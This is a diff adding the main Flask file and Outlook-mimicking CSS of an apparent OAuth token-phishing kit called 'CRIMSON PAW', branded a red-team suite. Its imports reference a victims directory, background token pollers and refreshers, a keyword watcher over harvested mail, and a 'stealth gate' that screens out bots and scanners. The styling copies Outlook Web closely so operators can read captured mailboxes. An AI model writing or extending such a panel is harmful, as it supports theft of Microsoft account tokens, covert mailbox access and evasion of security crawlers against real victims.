@@ -1,0 +1,16537 @@
+# ── main.py ──────────────────────────────────────────────
+from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for, Response
+import re
+import logging
+import time
+import datetime
+import os
+from pathlib import Path
+import shutil
+import json
+import sqlite3
+import math
+import secrets
+import db
+import oauth
+import graph
+import executor
+from executor import VICTIMS_DIR, _decode_jwt
+from config import Config
+from poller import TokenPoller
+from refresher import TokenRefresher
+from landing import CRIMSON_PAW_LANDING_HTML
+import keyword_watcher
+from core.stealth_gate import require_human_gate, generate_gate_token, verify_gate_token, is_known_bot, log_bot_hit
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+app = Flask(__name__)
+app.secret_key = os.environ.get('CRIMSON_SECRET_KEY', 'crimson_paw_obsidian_ruby_key_2026')
+app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(days=30)
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+poller = TokenPoller()
+poller.start()
+refresher = TokenRefresher()
+refresher.start()
+kw_watcher = keyword_watcher.KeywordWatcherThread(interval_seconds=45)
+kw_watcher.start()
+
+HTML_TEMPLATE = r'''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRIMSON PAW | Red Team Pentest Suite</title>
+    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <style>
+        :root { 
+            --bg-primary: #0a0709; 
+            --bg-sidebar: #100b0e; 
+            --bg-panel: #161014; 
+            --border-color: #2e1216; 
+            --text-primary: #f0ebed; 
+            --text-secondary: #a49498; 
+            --accent-color: #e50914; 
+            --accent-hover: #ff2a35;
+            --accent-glow: rgba(229, 9, 20, 0.35);
+            --danger: #e50914; 
+            --success: #2ea043; 
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; background: var(--bg-primary); color: var(--text-primary); display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 240px; background: var(--bg-sidebar); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; padding: 16px 0; transition: width 0.3s ease; position: relative; overflow: visible; flex-shrink: 0; z-index: 100; }
+        .sidebar.collapsed { width: 68px; }
+        .sidebar-header { padding: 0 20px 20px; font-size: 1.15em; font-weight: 800; color: #ffffff; border-bottom: 1px solid var(--border-color); margin-bottom: 10px; white-space: nowrap; display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .sidebar.collapsed .sidebar-header { padding: 0 10px 20px; font-size: 0; justify-content: center; }
+        .toggle-btn { position: absolute; right: -13px; top: 22px; width: 26px; height: 26px; background: #1c1014; border: 1.5px solid #e50914; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 999; transition: all 0.2s ease; box-shadow: 0 0 12px rgba(229, 9, 20, 0.45); color: #ffffff; font-size: 10px; font-weight: 800; outline: none; user-select: none; }
+        .toggle-btn:hover { background: #e50914; color: #ffffff; box-shadow: 0 0 16px rgba(229, 9, 20, 0.7); transform: scale(1.1); }
+        .sidebar.collapsed .toggle-btn { transform: none; }
+        .sidebar.collapsed .toggle-btn:hover { transform: scale(1.1); }
+        .nav-item { padding: 12px 20px; cursor: pointer; display: flex; align-items: center; gap: 12px; color: var(--text-secondary); white-space: nowrap; transition: background 0.15s, color 0.15s; }
+        .sidebar.collapsed .nav-item { padding: 12px 0; justify-content: center; }
+        .nav-item:hover { background: #1c1318; color: #ffffff; }
+        .nav-item.active { background: #261217; color: #ffffff; font-weight: 700; border-right: 3px solid var(--accent-color); box-shadow: inset 2px 0 8px rgba(229, 9, 20, 0.25); }
+        .nav-icon { width: 20px; text-align: center; }
+        .nav-text { transition: opacity 0.2s; }
+        .sidebar.collapsed .nav-text { opacity: 0; width: 0; }
+        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
+        .page-header { padding: 20px 30px; background: var(--bg-panel); border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+        .page-header h1 { font-size: 1.5em; font-weight: 700; color: #ffffff; }
+        .page-body { flex: 1; padding: 30px; overflow-y: auto; }
+        .page { display: none; height: 100%; flex-direction: column; }
+        .page.active { display: flex; }
+        .card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 24px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; text-align: center; box-shadow: 0 4px 16px rgba(0,0,0,0.4); }
+        .stat-value { font-size: 2.2em; font-weight: 800; color: var(--accent-color); margin-bottom: 8px; text-shadow: 0 0 16px rgba(229,9,20,0.3); }
+        .stat-label { font-size: 0.9em; color: var(--text-secondary); }
+        .btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 0.9em; white-space: nowrap; transition: all 0.15s; }
+        .btn-primary { background: linear-gradient(135deg, #e50914, #b00710); color: white; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 2px 10px rgba(229,9,20,0.4); }
+        .btn-primary:hover { background: linear-gradient(135deg, #ff1f2a, #cc0813); box-shadow: 0 4px 16px rgba(229,9,20,0.6); }
+        .btn-danger { background: #3d1419; color: #ff6b72; border: 1px solid #631c25; }
+        .btn-danger:hover { background: #e50914; color: white; }
+        .btn-secondary { background: #26161b; color: #e5dfe2; border: 1px solid #451b22; }
+        .btn-secondary:hover { background: #381921; color: white; }
+        .btn-sm { padding: 4px 8px; font-size: 0.85em; }
+        .table-wrapper { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 6px; }
+        table { width: 100%; border-collapse: collapse; background: var(--bg-panel); min-width: 800px; }
+        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 0.9em; color: var(--text-primary); }
+        th { background: #1a1015; font-weight: 700; color: #b09ba2; font-size: 0.78em; text-transform: uppercase; letter-spacing: 0.05em; border-bottom: 1px solid #38161b; }
+        tr:hover td { background: #1f141a; }
+        .status-captured { color: var(--success); font-weight: 600; }
+        .status-pending { color: #d29922; font-weight: 600; }
+        .status-expired, .status-failed { color: var(--danger); font-weight: 600; }
+        .action-group { display: flex; gap: 6px; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
+        .modal { background: #161014; border: 1px solid #38161b; border-radius: 12px; padding: 25px; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #38161b; padding-bottom: 10px; }
+        .close-btn { background: none; border: none; font-size: 1.5em; cursor: pointer; color: #a49498; }
+        .close-btn:hover { color: #ffffff; }
+        .token-group { margin-bottom: 20px; }
+        .token-label { font-weight: bold; color: var(--text-secondary); margin-bottom: 5px; display: block; }
+        .token-value { background: #100b0e; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.85em; word-break: break-all; border: 1px solid #38161b; max-height: 200px; overflow-y: auto; white-space: pre-wrap; color: #f0ebed; }
+        .template-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
+        .template-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; text-align: center; }
+        .template-icon { font-size: 2em; margin-bottom: 10px; }
+        .template-name { font-weight: 600; margin-bottom: 4px; }
+        .template-service { font-size: 0.85em; color: var(--text-secondary); }
+
+        /* ── Authentic outlook.live.com/mail Styles ─────────── */
+        .outlook-viewport { display: flex; flex-direction: column; height: 100%; width: 100%; background: #ffffff; overflow: hidden; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; font-size: 14px; }
+        
+        /* 1. Top Blue Suite Bar (#0078d4) */
+        .m365-suite-bar { height: 50px; background: #0078d4; color: #ffffff; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; gap: 20px; flex-shrink: 0; z-index: 10; user-select: none; }
+        .m365-brand { display: flex; align-items: center; gap: 14px; font-size: 17px; font-weight: 600; letter-spacing: -0.2px; flex-shrink: 0; }
+        .m365-waffle { width: 34px; height: 34px; display: grid; grid-template-columns: repeat(3, 4px); grid-template-rows: repeat(3, 4px); gap: 3px; align-content: center; justify-content: center; cursor: pointer; border-radius: 4px; }
+        .m365-waffle:hover { background: rgba(255,255,255,0.15); }
+        .m365-waffle span { width: 4px; height: 4px; background: #ffffff; border-radius: 0.5px; }
+        
+        .m365-search-pill { width: 520px; max-width: 50%; height: 36px; background: #ffffff; border-radius: 4px; display: flex; align-items: center; padding: 0 14px; gap: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+        .m365-search-pill svg { fill: #0078d4; flex-shrink: 0; }
+        .m365-search-pill input { border: none; outline: none; width: 100%; font-size: 14px; color: #323130; font-family: inherit; }
+        .m365-search-pill input::placeholder { color: #605e5c; }
+
+        .m365-suite-actions { display: flex; align-items: center; gap: 12px; margin-left: auto; }
+        .m365-suite-btn { background: transparent; border: none; color: #ffffff; width: 36px; height: 36px; border-radius: 4px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; transition: background 0.12s; }
+        .m365-suite-btn:hover { background: rgba(255,255,255,0.2); }
+        .m365-avatar-btn { width: 32px; height: 32px; border-radius: 50%; background: #c7e0f4; color: #004578; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; border: 1.5px solid rgba(255,255,255,0.7); cursor: pointer; user-select: none; }
+
+        /* Genuine Outlook Web Compose Window */
+        .owa-compose-container { background: #ffffff; width: 880px; max-width: 95vw; height: 720px; max-height: 92vh; border-radius: 8px; box-shadow: 0 16px 48px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow: hidden; border: 1px solid #d1d5db; }
+        .owa-compose-header { background: #ffffff; border-bottom: 1px solid #edebe9; height: 44px; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; user-select: none; }
+        .owa-compose-title { font-size: 14.5px; font-weight: 600; color: #201f1e; display: flex; align-items: center; gap: 8px; }
+        .owa-window-controls { display: flex; align-items: center; gap: 4px; }
+        .owa-win-btn { width: 32px; height: 32px; border: none; background: transparent; border-radius: 4px; color: #605e5c; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 14px; transition: background 0.12s; }
+        .owa-win-btn:hover { background: #edebe9; color: #201f1e; }
+        .owa-win-btn.close:hover { background: #a80000; color: #ffffff; }
+
+        .owa-compose-ribbon { background: #f3f2f1; border-bottom: 1px solid #e1dfdd; padding: 6px 14px; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; flex-shrink: 0; }
+        .owa-send-pill { background: #0078d4; color: #ffffff; border: none; border-radius: 4px; height: 32px; padding: 0 14px; display: flex; align-items: center; gap: 6px; font-size: 13.5px; font-weight: 600; cursor: pointer; transition: background 0.12s; }
+        .owa-send-pill:hover { background: #106ebe; }
+        .owa-send-pill:disabled { background: #c8c6c4; cursor: not-allowed; }
+        .owa-tool-btn { background: transparent; border: 1px solid transparent; border-radius: 4px; height: 30px; min-width: 30px; padding: 0 6px; display: flex; align-items: center; justify-content: center; font-size: 13px; color: #323130; cursor: pointer; transition: all 0.1s; }
+        .owa-tool-btn:hover { background: #ffffff; border-color: #d2d0ce; }
+        .owa-tool-select { background: #ffffff; border: 1px solid #d2d0ce; border-radius: 4px; height: 28px; padding: 0 6px; font-size: 12px; color: #323130; outline: none; cursor: pointer; }
+
+        .owa-compose-fields { padding: 10px 18px 4px; background: #ffffff; border-bottom: 1px solid #edebe9; display: flex; flex-direction: column; gap: 6px; flex-shrink: 0; }
+        .owa-field-row { display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #f3f2f1; padding-bottom: 5px; }
+        .owa-field-label { background: #edebe9; border: none; border-radius: 3px; font-size: 12px; font-weight: 600; color: #323130; padding: 3px 10px; cursor: pointer; min-width: 44px; text-align: center; }
+        .owa-field-input { flex: 1; border: none; outline: none; font-size: 13.5px; color: #201f1e; background: transparent; font-family: inherit; padding: 4px 0; }
+        .owa-field-toggle { color: #0078d4; font-size: 12px; font-weight: 600; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
+        .owa-field-toggle:hover { background: #deecf9; }
+        .owa-subject-input { width: 100%; border: none; outline: none; font-size: 15px; font-weight: 600; color: #201f1e; padding: 8px 0; font-family: inherit; }
+        .owa-subject-input::placeholder { color: #605e5c; font-weight: 400; }
+
+        .owa-compose-editor-wrap { flex: 1; min-height: 240px; padding: 14px 20px; overflow-y: auto; background: #ffffff; display: flex; flex-direction: column; }
+        .owa-rich-editor { flex: 1; min-height: 220px; outline: none; font-family: 'Segoe UI', Aptos, Calibri, sans-serif; font-size: 14px; line-height: 1.6; color: #201f1e; word-break: break-word; }
+        .owa-rich-editor:empty:before { content: attr(placeholder); color: #a19f9d; pointer-events: none; }
+
+        .owa-compose-statusbar { height: 34px; background: #faf9f8; border-top: 1px solid #edebe9; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; font-size: 12px; color: #605e5c; flex-shrink: 0; }
+
+        /* Genuine Outlook Web Settings Modal */
+        .owa-settings-container { background: #ffffff; width: 940px; max-width: 96vw; height: 740px; max-height: 90vh; border-radius: 8px; box-shadow: 0 16px 48px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow: hidden; border: 1px solid #d1d5db; }
+        .owa-settings-header { background: #ffffff; border-bottom: 1px solid #edebe9; height: 48px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; }
+        .owa-settings-title { font-size: 16px; font-weight: 600; color: #201f1e; display: flex; align-items: center; gap: 10px; }
+        .owa-settings-body { display: flex; flex: 1; min-height: 0; }
+        .owa-settings-sidebar { width: 220px; background: #f3f2f1; border-right: 1px solid #edebe9; padding: 14px 8px; display: flex; flex-direction: column; gap: 4px; flex-shrink: 0; }
+        .owa-sidebar-item { padding: 9px 14px; border-radius: 4px; font-size: 13.5px; font-weight: 600; color: #323130; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: background 0.12s; }
+        .owa-sidebar-item:hover { background: #edebe9; }
+        .owa-sidebar-item.active { background: #ffffff; color: #0078d4; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+        .owa-settings-main { flex: 1; overflow-y: auto; padding: 24px 30px; background: #ffffff; display: flex; flex-direction: column; gap: 20px; }
+        .owa-settings-section-title { font-size: 18px; font-weight: 600; color: #201f1e; margin-bottom: 4px; }
+        .owa-settings-section-desc { font-size: 13px; color: #605e5c; margin-bottom: 16px; }
+        .owa-config-card { background: #faf9f8; border: 1px solid #edebe9; border-radius: 6px; padding: 18px 20px; display: flex; flex-direction: column; gap: 12px; color: #201f1e !important; }
+        .owa-config-card h4 { font-size: 14px; font-weight: 600; color: #201f1e; margin: 0; }
+        .owa-toggle-group { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+        .owa-toggle-group label { color: #201f1e !important; font-size: 13.5px; }
+        .owa-input { border: 1px solid #8a8886; border-radius: 4px; padding: 8px 12px; font-size: 13.5px; color: #201f1e; background: #ffffff; outline: none; width: 100%; box-sizing: border-box; }
+        .owa-input:focus { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
+        .owa-select { border: 1px solid #8a8886; border-radius: 4px; padding: 8px 12px; font-size: 13.5px; color: #201f1e; background: #ffffff; outline: none; cursor: pointer; }
+        .owa-select:focus { border-color: #0078d4; }
+        .owa-textarea { border: 1px solid #8a8886; border-radius: 4px; padding: 10px 12px; font-size: 13.5px; color: #201f1e; background: #ffffff; outline: none; width: 100%; box-sizing: border-box; min-height: 80px; font-family: inherit; resize: vertical; }
+        .owa-textarea:focus { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
+        .owa-primary-btn { background: #0078d4; color: #ffffff; border: none; border-radius: 4px; padding: 8px 20px; font-size: 13.5px; font-weight: 600; cursor: pointer; transition: background 0.12s; display: inline-flex; align-items: center; gap: 6px; }
+        .owa-primary-btn:hover { background: #106ebe; }
+        .owa-secondary-btn { background: #ffffff; color: #323130; border: 1px solid #8a8886; border-radius: 4px; padding: 8px 16px; font-size: 13.5px; font-weight: 600; cursor: pointer; transition: all 0.12s; }
+        .owa-secondary-btn:hover { background: #f3f2f1; border-color: #323130; }
+        .owa-danger-btn { background: #a80000; color: #ffffff; border: none; border-radius: 4px; padding: 6px 12px; font-size: 12.5px; font-weight: 600; cursor: pointer; }
+        .owa-danger-btn:hover { background: #c50f1f; }
+
+        /* Genuine Outlook Web Attachment Tiles & Preview Modal */
+        .owa-attachments-bar { margin: 10px 28px 14px; padding: 12px 14px; background: #f8f9fa; border: 1px solid #edebe9; border-radius: 6px; display: flex; flex-direction: column; gap: 10px; }
+        .owa-attachments-header { display: flex; align-items: center; justify-content: space-between; }
+        .owa-attachments-count { font-size: 13px; font-weight: 600; color: #323130; display: flex; align-items: center; gap: 6px; }
+        .owa-download-all-btn { background: #ffffff; border: 1px solid #d2d0ce; border-radius: 4px; padding: 4px 12px; font-size: 12px; font-weight: 600; color: #0078d4; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; transition: all 0.12s; }
+        .owa-download-all-btn:hover { background: #eff6fc; border-color: #0078d4; }
+        .owa-attachments-grid { display: flex; flex-wrap: wrap; gap: 10px; }
+        .owa-attachment-card { background: #ffffff; border: 1px solid #e1dfdd; border-radius: 6px; padding: 8px 12px; display: flex; align-items: center; gap: 10px; min-width: 220px; max-width: 320px; box-shadow: 0 1px 3px rgba(0,0,0,0.04); transition: all 0.12s ease; cursor: pointer; position: relative; user-select: none; }
+        .owa-attachment-card:hover { border-color: #0078d4; box-shadow: 0 3px 10px rgba(0,0,0,0.08); background: #faf9f8; }
+        .owa-att-icon-badge { width: 36px; height: 36px; border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 700; font-size: 11px; color: #ffffff; letter-spacing: 0.5px; }
+        .owa-att-icon-badge.pdf { background: #d83b01; }
+        .owa-att-icon-badge.word { background: #106ebe; }
+        .owa-att-icon-badge.excel { background: #107c41; }
+        .owa-att-icon-badge.ppt { background: #c43e1c; }
+        .owa-att-icon-badge.img { background: #5c2d91; }
+        .owa-att-icon-badge.archive { background: #ff8c00; }
+        .owa-att-icon-badge.code { background: #004b50; }
+        .owa-att-icon-badge.other { background: #605e5c; }
+        .owa-att-meta { flex: 1; min-width: 0; display: flex; flex-direction: column; }
+        .owa-att-name { font-size: 13px; font-weight: 600; color: #201f1e; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .owa-att-size { font-size: 11.5px; color: #605e5c; margin-top: 2px; }
+        .owa-att-actions { display: flex; align-items: center; gap: 4px; }
+        .owa-att-action-btn { width: 28px; height: 28px; border: none; border-radius: 4px; background: transparent; color: #605e5c; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 13px; transition: all 0.12s; }
+        .owa-att-action-btn:hover { background: #edebe9; color: #0078d4; }
+        
+        .owa-preview-container { background: #ffffff; width: 920px; max-width: 96vw; height: 820px; max-height: 94vh; border-radius: 8px; box-shadow: 0 20px 60px rgba(0,0,0,0.35); display: flex; flex-direction: column; overflow: hidden; border: 1px solid #d1d5db; }
+        .owa-preview-header { background: #faf9f8; border-bottom: 1px solid #edebe9; height: 48px; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; }
+        .owa-preview-title { font-size: 14.5px; font-weight: 600; color: #201f1e; display: flex; align-items: center; gap: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 620px; }
+        .owa-preview-body { flex: 1; min-height: 0; background: #f3f2f1; display: flex; align-items: center; justify-content: center; overflow: auto; position: relative; padding: 16px; }
+
+        /* 2. Main Row: Outlook Workspace */
+        .outlook-main-row { display: flex; flex: 1; min-height: 0; overflow: hidden; }
+
+        /* Outlook Workspace */
+        .outlook-content-area { flex: 1; display: flex; flex-direction: column; min-width: 0; overflow: hidden; background: #ffffff; }
+
+        /* Menu Bar (File, Home, View, Help) */
+        .outlook-menu-tabs { height: 36px; background: #ffffff; border-bottom: 1px solid #edebe9; display: flex; align-items: center; padding: 0 16px; gap: 6px; font-size: 13.5px; color: #605e5c; flex-shrink: 0; user-select: none; }
+        .outlook-menu-item { padding: 5px 12px; cursor: pointer; border-radius: 3px; font-weight: 500; }
+        .outlook-menu-item:hover { background: #f3f2f1; color: #323130; }
+        .outlook-menu-item.active { font-weight: 600; color: #323130; position: relative; }
+        .outlook-menu-item.active::after { content: ''; position: absolute; bottom: -8px; left: 12px; right: 12px; height: 3px; background: #0078d4; border-radius: 2px 2px 0 0; }
+
+        /* Command Ribbon */
+        .outlook-command-ribbon { height: 48px; background: #ffffff; border-bottom: 1px solid #edebe9; display: flex; align-items: center; padding: 0 16px; gap: 8px; flex-shrink: 0; user-select: none; }
+        .ribbon-split-btn { display: flex; align-items: center; background: #0078d4; color: white; border-radius: 4px; height: 36px; font-size: 14px; font-weight: 600; cursor: pointer; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .ribbon-split-main { padding: 0 12px 0 14px; display: flex; align-items: center; gap: 8px; }
+        .ribbon-split-arrow { padding: 0 10px; border-left: 1px solid rgba(255,255,255,0.3); font-size: 11px; }
+        .ribbon-split-btn:hover { background: #106ebe; }
+        
+        .ribbon-btn { height: 36px; padding: 0 12px; border-radius: 4px; display: flex; align-items: center; gap: 8px; font-size: 13.5px; font-weight: 500; color: #323130; cursor: pointer; background: transparent; border: none; transition: background 0.1s; }
+        .ribbon-btn:hover { background: #f3f2f1; }
+        .ribbon-btn svg { fill: #0078d4; width: 16px; height: 16px; }
+        .ribbon-separator { width: 1px; height: 24px; background: #edebe9; margin: 0 6px; }
+        .ribbon-account-select { margin-left: auto; background: #f8f9fa; border: 1px solid #d1d5db; border-radius: 18px; padding: 6px 14px; font-size: 13px; font-weight: 500; color: #323130; outline: none; cursor: pointer; max-width: 320px; text-overflow: ellipsis; }
+
+        /* 3-Column Outlook Pane */
+        .outlook-3pane-layout { display: flex; flex: 1; min-height: 0; overflow: hidden; }
+
+        /* Column 1: Folder Pane (~250px) */
+        .outlook-col-folders { width: 250px; min-width: 230px; background: #ffffff; border-right: 1px solid #edebe9; display: flex; flex-direction: column; overflow-y: auto; padding: 12px 0; flex-shrink: 0; font-size: 14px; user-select: none; }
+        .folder-group-title { padding: 8px 16px; font-size: 13px; font-weight: 700; color: #605e5c; display: flex; align-items: center; gap: 8px; cursor: pointer; }
+        .folder-tree-node { display: flex; align-items: center; justify-content: space-between; padding: 8px 16px 8px 24px; cursor: pointer; color: #323130; font-size: 14px; transition: background 0.1s; }
+        .folder-tree-node:hover { background: #f3f2f1; }
+        .folder-tree-node.active { background: #edebe9; font-weight: 600; color: #0078d4; }
+        .folder-badge-blue { background: #0078d4; color: white; border-radius: 12px; font-size: 11.5px; padding: 2px 7px; font-weight: 700; }
+
+        /* Column 2: Message List Pane (~400px) */
+        .outlook-col-messages { width: 400px; min-width: 360px; background: #ffffff; border-right: 1px solid #edebe9; display: flex; flex-direction: column; flex-shrink: 0; min-height: 0; }
+        .messages-tab-bar { height: 44px; border-bottom: 1px solid #edebe9; display: flex; align-items: center; justify-content: space-between; padding: 0 18px; font-size: 14px; flex-shrink: 0; user-select: none; }
+        .messages-tab-group { display: flex; gap: 20px; align-items: center; }
+        .tab-button { cursor: pointer; color: #605e5c; font-weight: 600; padding: 12px 0; position: relative; font-size: 14px; }
+        .tab-button.active { color: #323130; }
+        .tab-button.active::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 3px; background: #0078d4; border-radius: 2px 2px 0 0; }
+        .messages-tab-tools { display: flex; gap: 12px; color: #605e5c; font-size: 15px; cursor: pointer; }
+
+        .messages-group-label { padding: 10px 18px 6px; font-size: 12px; font-weight: 700; color: #605e5c; display: flex; align-items: center; gap: 6px; background: #ffffff; user-select: none; }
+        .messages-scroll-area { flex: 1; overflow-y: auto; }
+        
+        /* Message Card matching screenshot */
+        .outlook-msg-card { display: flex; align-items: flex-start; padding: 12px 18px; border-bottom: 1px solid #f3f2f1; cursor: pointer; position: relative; background: #ffffff; gap: 12px; transition: background 0.1s; }
+        .outlook-msg-card:hover { background: #fbfbfb; }
+        .outlook-msg-card.selected { background: #deecf9 !important; border-left: 3px solid #0078d4; }
+        .msg-checkbox { width: 16px; height: 16px; border: 1px solid #605e5c; border-radius: 2px; margin-top: 2px; opacity: 0; transition: opacity 0.15s; flex-shrink: 0; display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:11px; }
+        .outlook-msg-card:hover .msg-checkbox, .outlook-msg-card.selected .msg-checkbox, .outlook-msg-card.cb-selected .msg-checkbox { opacity: 1; }
+        .msg-checkbox.cb-checked { background: #0078d4; border-color: #0078d4; color: white; }
+        .msg-checkbox.cb-checked::after { content: '\u2713'; font-weight:700; }
+        .outlook-msg-card.cb-selected { background: #deecf9 !important; }
+
+        .msg-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; color: #323130; flex-shrink: 0; }
+        .msg-card-content { flex: 1; min-width: 0; }
+        .msg-line-top { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 3px; }
+        .msg-author { font-size: 14px; font-weight: 600; color: #201f1e; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .msg-time { font-size: 12px; color: #605e5c; white-space: nowrap; margin-left: 8px; }
+        .msg-subject-line { font-size: 13.5px; color: #323130; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 3px; }
+        .outlook-msg-card.selected .msg-subject-line { color: #005a9e; font-weight: 600; }
+        .msg-snippet-line { font-size: 12.5px; color: #605e5c; line-height: 1.45em; height: 2.9em; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; }
+
+        /* Column 3: Reading Pane (Flex 1) */
+        .outlook-col-reading { flex: 1; background: #ffffff; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
+        .reader-inner-scroll { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
+        
+        .reader-headline-row { padding: 22px 28px 12px; display: flex; justify-content: space-between; align-items: flex-start; }
+        .reader-big-subject { font-size: 21px; font-weight: 600; color: #201f1e; line-height: 1.35; }
+        .reader-top-action-icons { display: flex; align-items: center; gap: 14px; color: #605e5c; font-size: 18px; cursor: pointer; flex-shrink: 0; margin-left: 16px; }
+        .reader-top-action-icons span:hover { color: #0078d4; }
+
+        .reader-sender-box { padding: 0 28px 14px; display: flex; align-items: flex-start; gap: 14px; }
+        .reader-circle-avatar { width: 40px; height: 40px; border-radius: 50%; background: #c7e0f4; color: #004578; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0; }
+        .reader-sender-text { flex: 1; min-width: 0; font-size: 13.5px; }
+        .reader-sender-link { font-weight: 600; color: #0078d4; cursor: pointer; text-decoration: none; }
+        .reader-to-line { color: #605e5c; margin-top: 2px; font-size: 13px; }
+        .reader-date-right { color: #605e5c; font-size: 12px; margin-top: 1px; }
+
+        .reader-view-web-notice { padding: 10px 28px; font-size: 12px; color: #605e5c; text-align: center; border-bottom: 1px solid #f3f2f1; background: #faf9f8; }
+        .reader-view-web-notice a { color: #0078d4; text-decoration: none; }
+
+        .reader-sub-banner { margin: 0 28px 12px; padding: 8px 14px; background: #fdf6f0; border: 1px solid #f9dfcd; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; font-size: 12.5px; color: #794500; }
+        .reader-sub-btn { background: transparent; border: 1px solid #c7a783; padding: 3px 8px; border-radius: 3px; font-size: 11.5px; cursor: pointer; color: #794500; font-weight: 500; }
+        .reader-sub-btn:hover { background: rgba(0,0,0,0.05); }
+
+        .reader-deleted-banner { margin: 0 28px 12px; padding: 10px 16px; background: #fff4ce; border: 1px solid #fed966; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #7d3f00; }
+
+        .email-body-iframe { width: 100%; border: none; min-height: 500px; display: block; background: #ffffff; }
+
+        .msg-card-actions { display: none; position: absolute; right: 10px; top: 8px; background: #ffffff; border: 1px solid #edebe9; border-radius: 4px; padding: 2px 4px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); gap: 6px; z-index: 5; }
+        .outlook-msg-card:hover .msg-card-actions { display: flex; }
+        .msg-action-icon { cursor: pointer; padding: 2px 5px; font-size: 13px; border-radius: 2px; color: #605e5c; }
+        .msg-action-icon:hover { background: #f3f2f1; color: #0078d4; }
+
+        .unread-dot { width: 8px; height: 8px; background: #0078d4; border-radius: 50%; display: inline-block; margin-right: 6px; flex-shrink: 0; }
+        .flag-active { color: #d83b01 !important; }
+
+        .outlook-toast { position: fixed; bottom: 24px; right: 24px; background: #323130; color: #ffffff; padding: 12px 22px; border-radius: 6px; font-size: 13.5px; font-weight: 500; display: none; z-index: 9999; box-shadow: 0 4px 16px rgba(0,0,0,0.25); transition: opacity 0.3s; }
+
+        .reader-html-body-wrapper { flex: 1; padding: 0; background: #ffffff; overflow-y: auto; width: 100%; font-size: 14px; line-height: 1.6; }
+
+        /* Settings Dialog */
